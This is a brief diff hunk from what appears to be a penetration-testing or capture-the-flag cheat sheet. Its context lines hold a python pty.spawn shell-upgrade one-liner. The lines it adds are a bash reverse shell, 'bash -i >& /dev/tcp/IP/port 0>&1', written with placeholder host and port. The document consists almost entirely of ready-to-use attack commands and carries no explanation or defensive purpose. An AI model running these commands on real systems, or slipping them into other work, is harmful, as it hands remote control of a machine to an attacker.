@@ -36,3 +36,6 @@ bash xxx.sh
 
 python -c 'import pty; pty.spawn("/bin/bash")'
  
+#bash shell
+#!/bin/bash
+bash -i >& /dev/tcp/IP/port 0>&1
